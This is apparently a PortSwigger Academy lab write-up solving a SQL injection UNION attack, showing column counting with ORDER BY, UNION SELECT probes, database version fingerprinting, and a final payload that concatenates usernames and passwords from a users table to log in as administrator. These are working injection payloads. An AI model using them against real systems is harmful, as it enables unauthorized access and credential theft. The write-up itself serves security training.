## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/30248f0f83c1a5d0c71ba4d9f30891ce18829b55/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Lab%20Description.png)

## Solution :

**String concatenation**

You can concatenate together multiple strings to make a single string.

|    Name    	| Command                                               	|
|:----------:	|-------------------------------------------------------	|
|  MICROSOFT 	| 'foo'+'bar'                                           	|
| POSTgreSQL 	| 'foo'\|\|'bar'                                        	|
| MYSQL      	| 'foo' 'bar' [Note the space between the two strings]  	|
|            	| CONCAT('foo','bar')                                   	|
| ORACLE     	| 'foo'\| \|'bar'                                       	|

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/f456c072d7b1a43a0ab85e457ce9de33c8e180a6/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Pets%20Category.png)


Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Determine the number of columns -

**ORDER BY 3** returns an error, which means there are 2 columns that is retreived by the web app from the db.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/e3d496c485c84f9802916e0b8a4a4209e907bb69/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Internal%20Error%20-%20Number%20of%20Columns.png)

#### Determine which columns contain text data -

**1st column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/28413368434043735559488c1297a2a73a37a39b/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Payload%20in%201st%20NULL.png)

**2nd Column**

This column contains text data 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/33246ef2e9bd41e325645c912596d07877c86c15/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Payload%20in%202nd%20NULL.png)


#### Determine the type of database -

![image]()

Since we know 2nd column is containing text data, we can try to use version command of each database system to identify the type of database present in the backend.

**ORACLE**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

![image]()

500 - SERVER ERROR

**Microsoft**


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,@@version --
```

![image]()

500 - Server Error

> NOTE - Syntax for findng version is the same for both Microsoft and MYSQL



**PostgreSQL**



```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version() --
```

![image]()

We can confirm that this is an POSTgreSQL db in backend.

![image]()

#### Retreive multiple values in single column -

For POSTgreSQL , the syntax for string concatination is `'foo'||'bar'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,username||'-'||password FROM users --
```

![image]()

We got all the usernames & passwords,

![image]()

Now we can login as administrator

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/cfe565b5cef18900f51c93838943a5c61177eb25/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Lab%20Solution.png)







